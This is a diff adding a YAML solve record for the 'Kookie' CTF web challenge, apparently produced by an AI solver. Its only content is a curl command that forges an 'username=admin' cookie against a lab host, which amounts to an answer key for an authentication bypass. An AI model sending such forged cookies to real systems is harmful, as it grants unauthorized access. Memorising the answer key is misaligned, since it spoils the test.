@@ -1,0 +1,17 @@
+name: '[BSidesCF 2019]Kookie'
+category: web
+keywords:
+- bsidescf
+- kookie
+- imported
+- from
+- buuctf
+- ctfd
+steps:
+- '[codex] - Recovery command: `curl -b "username=admin" http://78f11bcc64760cca09c70937.http-ctf2.dasctf.com:80/`'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[codex] - Recovery command: `curl -b "username=admin" http://78f11bcc64760cca09c70937.http-ctf2.dasctf.com:80/`'
+success_format: CTF2\{[^}]+\}
+source: b2b1ff9d-5f0c-4c04-abaf-fab02edab6f6 (solver babd346b-69cb-40af-9e5f-57e5c10f0611)
+notes: ''
